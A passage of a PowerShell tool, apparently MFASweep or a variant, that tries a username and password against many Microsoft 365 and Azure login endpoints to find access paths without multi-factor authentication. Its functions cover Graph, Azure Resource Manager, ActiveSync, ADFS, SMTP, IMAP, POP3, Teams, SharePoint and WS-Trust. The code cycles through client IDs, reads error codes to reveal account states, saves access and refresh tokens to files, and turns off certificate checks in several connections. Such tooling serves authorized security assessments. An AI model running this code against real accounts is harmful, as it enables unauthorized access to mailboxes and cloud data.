    Set-Content -Path $fileName -Value $sanitizedContent -Encoding ASCII
    Write-Host -ForegroundColor DarkYellow "[***] Saved sanitized debug capture to $fileName"
}

Function Write-DebugWebAuthCookieCapture{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $UAtype = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Stage = "",

    [Parameter(Position = 2, Mandatory = $True)]
    $CookieContainer

    )

    $cookieLines = @()
    foreach ($uri in @(
        'https://login.microsoftonline.com',
        'https://outlook.office365.com',
        'https://outlook.office.com'
    )) {
        try {
            $cookies = $CookieContainer.GetCookies($uri)
            foreach ($cookie in $cookies) {
                $cookieLines += "$uri`t$($cookie.Name)=<REDACTED>"
            }
        }
        catch {
        }
    }

    if (-not $cookieLines) {
        $cookieLines = @('No cookies captured')
    }

    $safeUa = ($UAtype -replace '[^A-Za-z0-9_-]', '_')
    $safeStage = ($Stage -replace '[^A-Za-z0-9_-]', '_')
    $fileName = "WebAuthDebug-$safeUa-$safeStage.txt"
    Set-Content -Path $fileName -Value ($cookieLines -join [Environment]::NewLine) -Encoding ASCII
    Write-Host -ForegroundColor DarkYellow "[***] Saved sanitized debug capture to $fileName"
}





Function Invoke-GraphAPIAuth{
    
    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $ClientId = "1b730954-1685-4b74-9bfd-dac224a7b894",

    [Parameter(Position = 3, Mandatory = $False)]
    [switch]
    $BruteClients,

    [Parameter(Position = 4, Mandatory = $False)]
    [string]$Resource = "https://graph.windows.net",

    [Parameter(Position = 5, Mandatory = $False)]
    [switch]$WriteTokens,

    [Parameter(Position = 6, Mandatory = $False)]
    [switch]$VerboseOut

    )
    
    
    if (-not $BruteClients){
        Write-Host `r`n
        Write-Host "---------------- Microsoft Graph API ----------------"
        Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft Graph API..."
    }

    $ErrorActionPreference = 'silentlycontinue'

    $URL = "https://login.microsoft.com"

    # Setting up the web request
    $BodyParams = @{'resource' = $Resource; 'client_id' = $ClientId ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
    $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
    $webrequest = Invoke-MFASweepWebRequest -Uri "$URL/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 

    # If we get a 200 response code it's a valid cred
    If ($BruteClients){
        If ($webrequest.StatusCode -eq "200"){
        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to $Resource single factor using clientID $ClientId"
        $global:bruteClientIDHits++
        $responseContent = $webrequest.Content | ConvertFrom-Json
        $accessToken = $responseContent.access_token
        $refreshToken = $responseContent.refresh_token
        if ($WriteTokens) {
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $accessToken -RefreshToken $refreshToken
            }
        if ($verboseout){
            $parts = $accessToken -split '\.'

            # Decode the payload (second part) from Base64
            $payload = $parts[1]
            $padding = switch ($payload.Length % 4) { 
                2 { '==' }
                3 { '=' }
                0 { '' }
                default { throw "Invalid base64 string length" }
            }
            $payload += $padding
            $decodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))

            # Convert the decoded payload from JSON
            $jwtData = $decodedPayload | ConvertFrom-Json

            # Extract and print the 'aud', 'appid', and 'scp' fields
            $aud = $jwtData.aud
            $appid = $jwtData.appid
            $scp = $jwtData.scp

            Write-Output "Audience (aud): $aud"
            Write-Output "App ID (appid): $appid"
            Write-Output "Scope (scp): $scp"
        }
        Write-Host "--------------------------------"
        }
    }else{
    If ($webrequest.StatusCode -eq "200"){
        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to $Resource"
    
        $responseContent = $webrequest.Content | ConvertFrom-Json
        $accessToken = $responseContent.access_token
        $refreshToken = $responseContent.refresh_token

        Write-Host -ForegroundColor DarkGreen "[***] NOTE: The `"MSOnline`" PowerShell module should work here."
        
        if ($WriteTokens) {
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $accessToken -RefreshToken $refreshToken    
            }
        $global:graphresult = "YES" 
        Write-Verbose $webrequest.Content
        $webrequest = ""
    }
    else{
            # Check the response for indication of MFA, tenant, valid user, etc...
            # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
            # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

            # Standard invalid password
        If($RespErr -match "AADSTS50126")
            {
            Write-Host -ForegroundColor red "[*] Login appears to have failed."
            }

            # Invalid Tenant Response
        ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
            {
            Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
            }

            # Invalid Username
        ElseIf($RespErr -match "AADSTS50034")
            {
            Write-Output "[*] WARNING! The user $username doesn't exist."
            }

            # Microsoft MFA response
        ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to $Resource - NOTE: The response indicates MFA (Microsoft) is in use."
            }
    
            # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
        ElseIf($RespErr -match "AADSTS50158")
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to $Resource - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
            }

            # Conditional Access policy blocked token issuance
        ElseIf($RespErr -match "AADSTS53003")
            {
            Write-Output "[*] WARNING! The account $username appears to be blocked by a Conditional Access Policy."
            }

            # Locked out account or Smart Lockout in place
        ElseIf($RespErr -match "AADSTS50053")
            {
            Write-Output "[*] WARNING! The account $username appears to be locked."
            }

            # Disabled account
        ElseIf($RespErr -match "AADSTS50057")
            {
            Write-Output "[*] WARNING! The account $username appears to be disabled."
            }
            
            # User password is expired
        ElseIf($RespErr -match "AADSTS50055")
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to the Microsoft Graph API - NOTE: The user's password is expired."
            }

            # Unknown errors
        Else
            {
            Write-Output "[*] Got an error we haven't seen yet for user $username"
            $RespErr
            }
        }
    }

}


Function Invoke-AzureManagementAPIAuth{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [switch]$WriteTokens
    )
    
    Write-Host `r`n
    Write-Host "---------------- Azure Resource Manager API ----------------"

    $ErrorActionPreference = 'silentlycontinue'

    $URL = "https://login.microsoftonline.com"

    Write-Host -ForegroundColor Yellow "[*] Authenticating to Azure Resource Manager API..."
    $resource = "https://management.core.windows.net"
    $clientid = "1950a258-227b-4e31-a9cf-717495945fc2"

    # Setting up the web request
    $BodyParams = @{'resource' = 'https://management.core.windows.net'; 'client_id' = '1950a258-227b-4e31-a9cf-717495945fc2' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
    $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
    $webrequest = Invoke-MFASweepWebRequest -Uri "$URL/Common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 

    # If we get a 200 response code it's a valid cred
    If ($webrequest.StatusCode -eq "200"){
    Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to the Azure Resource Manager API"
        $responseContent = $webrequest.Content | ConvertFrom-Json
        $accessToken = $responseContent.access_token
        $refreshToken = $responseContent.refresh_token
        if ($WriteTokens) {
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $accessToken -RefreshToken $refreshToken
            }
    Write-Host -ForegroundColor DarkGreen "[***] NOTE: The `"Az`" PowerShell module should work here."
    $global:smresult = "YES" 
    Write-Verbose $webrequest.Content
        $webrequest = ""
    }
    else{
            # Check the response for indication of MFA, tenant, valid user, etc...
            # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
            # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

            # Standard invalid password
        If($RespErr -match "AADSTS50126")
            {
            Write-Host -ForegroundColor Red "[*] Login appears to have failed."
            }

            # Invalid Tenant Response
        ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
            {
            Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
            }

            # Invalid Username
        ElseIf($RespErr -match "AADSTS50034")
            {
            Write-Output "[*] WARNING! The user $username doesn't exist."
            }

            # Microsoft MFA response
        ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to the Azure Resource Manager API - NOTE: The response indicates MFA (Microsoft) is in use."
            }
    
            # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
        ElseIf($RespErr -match "AADSTS50158")
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to the Azure Resource Manager API - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
            }

            # Conditional Access policy blocked token issuance
        ElseIf($RespErr -match "AADSTS53003")
            {
            Write-Output "[*] WARNING! The account $username appears to be blocked by a Conditional Access Policy."
            }

            # Locked out account or Smart Lockout in place
        ElseIf($RespErr -match "AADSTS50053")
            {
            Write-Output "[*] WARNING! The account $username appears to be locked."
            }

            # Disabled account
        ElseIf($RespErr -match "AADSTS50057")
            {
            Write-Output "[*] WARNING! The account $username appears to be disabled."
            }
            
            # User password is expired
        ElseIf($RespErr -match "AADSTS50055")
            {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username was able to authenticate to the Azure Resource Manager API - NOTE: The user's password is expired."
            }

            # Unknown errors
        Else
            {
            Write-Output "[*] Got an error we haven't seen yet for user $username"
            $RespErr
            }
    }


}



Function Invoke-O365ActiveSyncAuth{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = ""
    )

    Write-Host `r`n
    Write-Host "---------------- Microsoft 365 ActiveSync ----------------"

    Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft 365 Active Sync..."

    $EASURL = ("https://" + "outlook.office365.com" + "/Microsoft-Server-ActiveSync")
    
    $EncodeUsernamePassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($('{0}:{1}' -f $Username, $Password)))
    $Headers = @{'Authorization' = "Basic $($EncodeUsernamePassword)"}
    
    $StatusCode = $null
    try {
        $easlogin = Invoke-MFASweepWebRequest -Uri $EASURL -Headers $Headers -Method Get -ErrorAction Stop
    }
    catch {
        $StatusCode = Get-HttpStatusCodeFromErrorRecord -ErrorRecord $_
    }

        if ($StatusCode -eq 505)
        {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $username successfully authenticated to O365 ActiveSync."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: The Windows 10 Mail app can connect to ActiveSync."  
            $global:asyncresult = "YES"
        }
        else{
            Write-Host -ForegroundColor Red "[*] Login to ActiveSync failed."
        }


    }

Function Invoke-ADFSAuth{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = ""
    
    )
    
    Write-Host `r`n
    Write-Host "---------------- ADFS Authentication ----------------"

    $ErrorActionPreference = 'silentlycontinue' 

    Write-Host "[*] Getting ADFS URL..."

        $ADFSCheck = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$UserName&xml=1"
        [xml]$ADFSXML = $ADFSCheck.Content
        If($adfsxml.RealmInfo.NameSpaceType -like "Federated"){
            If($ADFSXML.RealmInfo.AuthUrl){
            Write-Host -ForegroundColor Cyan ("[*] Found the ADFS authentication URL here: " + $adfsxml.RealmInfo.AuthURL)
            }
            Else{
            Write-Host -ForegroundColor Red "[*] Something went wrong. Couldn't Find the ADFS authentication URL."
            }
        }
        ElseIf($adfsxml.RealmInfo.NameSpaceType -like "Managed"){
    
        Write-Host -ForegroundColor Cyan "[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft."
        }
        ElseIf($adfsxml.RealmInfo.NameSpaceType -like "Unknown"){
    
        Write-Host -ForegroundColor Red "[*] The domain associated with the email address you submitted does appear to have a presence in Microsoft Online / O365. Authentication will likely fail."
        }
  

    Write-Host -ForegroundColor Yellow ("[*] Authenticating to On-Prem ADFS Portal at: " + $ADFSXML.RealmInfo.AuthUrl)
    $ADFSCheck = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$UserName&xml=1"
    [xml]$ADFSXML = $ADFSCheck.Content

    $adfsurl = $ADFSXML.RealmInfo.AuthUrl
    [uri]$RootADFSURL = $ADFSXML.RealmInfo.AuthUrl
    $ADFSDomain = $RootADFSURL.Host

    $SessionRequest = Invoke-MFASweepWebRequest -Uri $adfsurl -SessionVariable adfs -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
    $userform = $SessionRequest.Forms[0]
    $userform.Fields["UserName"] = $Username
    $userform.Fields["Password"] = $Password
    $userform.Fields["AuthMethod"] = "FormsAuthentication"
    $adfsauthpath = $SessionRequest.Forms[0] | Select-Object -ExpandProperty Action

    $FullADFSURL = ("https://" + $ADFSDomain + $adfsauthpath)

    $ADFSAuthAttempt= Invoke-MFASweepWebRequest -Uri $FullADFSURL -WebSession $adfs -Method POST -Body $userform.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)

    if ($adfs.Cookies.GetCookies($FullADFSURL).Name -like "MSISAUTH")
    {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $username was able to authenticate to the ADFS Portal. Checking MFA now..."

        Write-Host -ForegroundColor Yellow "[**] NOTE: This part may open a browser. If closed immediately it may prevent an SMS/call to the user."

        $i = 5

        do {
            Write-Host -ForegroundColor Yellow "[**] Sending Auth Request in $i...`r" -NoNewline
            Sleep 1
            $i--
        } while ($i -gt 0)

        $ADFSSRFAuth = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/login.srf" -WebSession $adfsmsonline -Method POST -Body $ADFSAuthAttempt.Forms[0].Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -MaximumRedirection 0 
        
        if ($ADFSSRFAuth.Content -match "Stay signed in"){
        Write-Host -ForegroundColor Cyan "[**] It appears there is no MFA for this account."
        $global:adfsresult = "YES" 
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Login with a web browser to $FullADFSURL" 
        Foreach ($cookie in $adfs.Cookies.GetCookies($FullADFSURL)){write-verbose ($cookie.name + " = " + $cookie.value)}
        }
        elseif($ADFSSRFAuth.StatusCode -eq 302){
        Write-Host -ForegroundColor Red "[**] Got redirected after login..."
            if($ADFSSRFAuth.Headers.Location -match "device.login.microsoftonline.com"){
                Write-Host -ForegroundColor Red "[**] Redirection to device login occurred. This may indicate MFA is in place and is setup to SMS or Call the user."
            }
        }
        elseif ($ADFSSRFAuth.Content -match "Verify your identity"){
        Write-Host -ForegroundColor Red "[**] It appears MFA is setup for this account to access Microsoft 365 via ADFS." 
        Foreach ($cookie in $adfs.Cookies.GetCookies($FullADFSURL)){write-verbose ($cookie.name + " = " + $cookie.value)}
        }
    }
    else{
    Write-Host -ForegroundColor red "[*] Login appears to have failed."
    }

}




Function Invoke-SMTPAuth {
<#
.SYNOPSIS
    Tests SMTP Basic Authentication against smtp.office365.com:587 (STARTTLS + AUTH LOGIN).
    A successful login means SMTP AUTH is enabled for the account  - a common legacy auth gap.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- SMTP Basic Auth (smtp.office365.com:587) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing SMTP AUTH LOGIN against smtp.office365.com:587..."

    try {
        $tcp       = New-Object System.Net.Sockets.TcpClient("smtp.office365.com", 587)
        $stream    = $tcp.GetStream()
        $reader    = New-Object System.IO.StreamReader($stream)
        $writer    = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $null = $reader.ReadLine()                              # banner
        $writer.WriteLine("EHLO mfasweep.local")
        do { $line = $reader.ReadLine() } while ($line -match "^250-")

        $writer.WriteLine("STARTTLS")
        $tlsResp = $reader.ReadLine()
        if ($tlsResp -notmatch "^220") {
            Write-Host -ForegroundColor Red "[*] SMTP STARTTLS not supported. Cannot test AUTH."
            $tcp.Close(); return
        }

        $ssl = New-Object System.Net.Security.SslStream($stream, $false, { $true })
        $ssl.AuthenticateAsClient("smtp.office365.com")
        $sslReader = New-Object System.IO.StreamReader($ssl)
        $sslWriter = New-Object System.IO.StreamWriter($ssl)
        $sslWriter.AutoFlush = $true

        $sslWriter.WriteLine("EHLO mfasweep.local")
        do { $line = $sslReader.ReadLine() } while ($line -match "^250-")

        $sslWriter.WriteLine("AUTH LOGIN")
        $r = $sslReader.ReadLine()
        if ($r -notmatch "^334") {
            Write-Host -ForegroundColor Yellow "[*] SMTP AUTH LOGIN not offered by server. Response: $r"
            $tcp.Close(); return
        }

        $sslWriter.WriteLine([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Username)))
        $null = $sslReader.ReadLine()
        $sslWriter.WriteLine([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Password)))
        $authResp = $sslReader.ReadLine()

        if ($authResp -match "^235") {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated via SMTP AUTH LOGIN. Legacy SMTP auth is enabled and NOT protected by MFA."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: Outlook/Exchange clients using basic SMTP will work without MFA."
            $global:smtpresult = "YES"
        } elseif ($authResp -match "^535") {
            Write-Host -ForegroundColor Red "[*] SMTP AUTH failed  - invalid credentials or SMTP AUTH disabled for this account."
        } else {
            Write-Host -ForegroundColor Yellow "[*] SMTP AUTH unexpected response: $authResp"
        }
        $tcp.Close()
    } catch {
        Write-Host -ForegroundColor Red "[*] SMTP connection error: $_"
    }
}


Function Invoke-IMAPAuth {
<#
.SYNOPSIS
    Tests IMAP Basic Authentication against outlook.office365.com:993 (SSL).
    A successful login means IMAP AUTH is enabled  - another common legacy auth gap.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- IMAP Basic Auth (outlook.office365.com:993) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing IMAP LOGIN against outlook.office365.com:993..."

    try {
        $tcp  = New-Object System.Net.Sockets.TcpClient("outlook.office365.com", 993)
        $ssl  = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, { $true })
        $ssl.AuthenticateAsClient("outlook.office365.com")
        $reader = New-Object System.IO.StreamReader($ssl)
        $writer = New-Object System.IO.StreamWriter($ssl)
        $writer.AutoFlush = $true

        $banner = $reader.ReadLine()

        $writer.WriteLine("a001 LOGIN ""$Username"" ""$Password""")
        $resp = $reader.ReadLine()

        if ($resp -match "^a001 OK") {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated via IMAP LOGIN. Legacy IMAP auth is enabled and NOT protected by MFA."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: Any IMAP email client can connect without MFA."
            $global:imapresult = "YES"
        } elseif ($resp -match "AUTHENTICATE") {
            Write-Host -ForegroundColor Yellow "[*] IMAP plain LOGIN is disabled  - server requires OAuth2 (XOAUTH2). Legacy IMAP auth appears blocked."
        } elseif ($resp -match "^a001 NO") {
            Write-Host -ForegroundColor Red "[*] IMAP AUTH failed  - invalid credentials or IMAP AUTH disabled for this account."
        } else {
            Write-Host -ForegroundColor Yellow "[*] IMAP unexpected response: $resp"
        }
        $tcp.Close()
    } catch {
        Write-Host -ForegroundColor Red "[*] IMAP connection error: $_"
    }
}


Function Invoke-TeamsROPCAuth {
<#
.SYNOPSIS
    Tests Microsoft Teams API access via ROPC (Resource Owner Password Credentials) flow.
    Uses the official Teams client ID. A YES result means Teams can be accessed without MFA.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Microsoft Teams API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft Teams API via ROPC..."

    $Resource = "https://api.spaces.skype.com"
    $ClientId  = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"   # Microsoft Teams

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Microsoft Teams API without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Teams clients and the Teams API are accessible single-factor."
        $global:teamsresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                 { Write-Host -ForegroundColor Red     "[*] Teams API login failed  - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")) {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Teams API  - MFA (Microsoft) is required."
            $global:teamsresult = "YES (MFA)"
        }
        elseif ($RespErr -match "AADSTS50158")                                 { Write-Host -ForegroundColor Green   "[*] SUCCESS! $Username authenticated to Teams API  - Conditional Access MFA (DUO/other) required."; $global:teamsresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                 { Write-Host                          "[*] WARNING! Conditional Access policy blocked Teams API access for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                 { Write-Host                          "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                 { Write-Host                          "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                 { Write-Host -ForegroundColor Green   "[*] SUCCESS! $Username authenticated to Teams API  - password is expired."; $global:teamsresult = "YES (pwd expired)" }
        else                                                                   { Write-Host                          "[*] Teams API: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-SharePointROPCAuth {
<#
.SYNOPSIS
    Tests SharePoint/OneDrive access via ROPC (Resource Owner Password Credentials) flow.
    Requires the tenant SharePoint domain prefix (e.g. "contoso" for contoso.sharepoint.com).
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $True)]  [string] $TenantDomain,
        [Parameter(Position = 3, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- SharePoint / OneDrive API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to SharePoint/OneDrive API via ROPC (tenant: $TenantDomain)..."

    $Resource = "https://$TenantDomain.sharepoint.com"
    $ClientId  = "9bc3ab49-b65d-410a-85ad-de819febfddc"   # SharePoint Online Client Extensibility

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to SharePoint/OneDrive ($TenantDomain) without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: SharePoint and OneDrive are accessible single-factor for this account."
        $global:sharepointresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                 { Write-Host -ForegroundColor Red     "[*] SharePoint/OneDrive login failed  - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")) {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to SharePoint  - MFA (Microsoft) is required."
            $global:sharepointresult = "YES (MFA)"
        }
        elseif ($RespErr -match "AADSTS50158")                                 { Write-Host -ForegroundColor Green   "[*] SUCCESS! $Username authenticated to SharePoint  - Conditional Access MFA required."; $global:sharepointresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                 { Write-Host                          "[*] WARNING! Conditional Access policy blocked SharePoint access for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                 { Write-Host                          "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                 { Write-Host                          "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                 { Write-Host -ForegroundColor Green   "[*] SUCCESS! $Username authenticated to SharePoint  - password is expired."; $global:sharepointresult = "YES (pwd expired)" }
        else                                                                   { Write-Host                          "[*] SharePoint: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-POP3Auth {
<#
.SYNOPSIS
    Tests POP3 Basic Authentication against outlook.office365.com:995 (implicit SSL).
    POP3 inherently cannot enforce MFA  - a YES means mail is accessible without MFA.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- POP3 Basic Auth (outlook.office365.com:995) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing POP3 USER/PASS against outlook.office365.com:995..."

    try {
        $tcp  = New-Object System.Net.Sockets.TcpClient("outlook.office365.com", 995)
        $ssl  = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, { $true })
        $ssl.AuthenticateAsClient("outlook.office365.com")
        $reader = New-Object System.IO.StreamReader($ssl)
        $writer = New-Object System.IO.StreamWriter($ssl)
        $writer.AutoFlush = $true

        $banner = $reader.ReadLine()

        $writer.WriteLine("USER $Username")
        $userResp = $reader.ReadLine()

        if ($userResp -notmatch "^\+OK") {
            Write-Host -ForegroundColor Yellow "[*] POP3 USER command rejected. Response: $userResp"
            $tcp.Close(); return
        }

        $writer.WriteLine("PASS $Password")
        $passResp = $reader.ReadLine()

        if ($passResp -match "^\+OK") {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated via POP3. Legacy POP3 auth is enabled and NOT protected by MFA."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: Any POP3 email client can access this mailbox without MFA."
            $global:pop3result = "YES"
            $writer.WriteLine("QUIT")
        } elseif ($passResp -match "^\-ERR") {
            Write-Host -ForegroundColor Red "[*] POP3 AUTH failed  - invalid credentials or POP3 AUTH disabled."
        } else {
            Write-Host -ForegroundColor Yellow "[*] POP3 unexpected response: $passResp"
        }
        $tcp.Close()
    } catch {
        Write-Host -ForegroundColor Red "[*] POP3 connection error: $_"
    }
}


Function Invoke-WSTrustAuth {
<#
.SYNOPSIS
    Tests WS-Trust 2005 WindowsTransport endpoint  - a legacy SOAP-based auth flow that
    inherently cannot enforce MFA. If credentials are accepted this is a no-MFA access path.
    The endpoint: login.microsoftonline.com/adfs/services/trust/2005/windowstransport
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- WS-Trust Legacy SOAP Auth ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing WS-Trust 2005 WindowsTransport endpoint (no MFA support by design)..."

    $realmCheck = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$Username&xml=1" -ErrorAction SilentlyContinue
    if ($realmCheck) {
        [xml]$realm = $realmCheck.Content
        if ($realm.RealmInfo.NameSpaceType -ne "Federated") {
            Write-Host -ForegroundColor Yellow "[*] Domain is not Federated (ADFS). WS-Trust WindowsTransport test not applicable for managed domains."
            return
        }
    }

    $wsUrl = "https://login.microsoftonline.com/adfs/services/trust/2005/windowstransport"
    $xmlUsername = [System.Net.WebUtility]::HtmlEncode($Username)
    $xmlPassword = [System.Net.WebUtility]::HtmlEncode($Password)
    $soapBody = @"
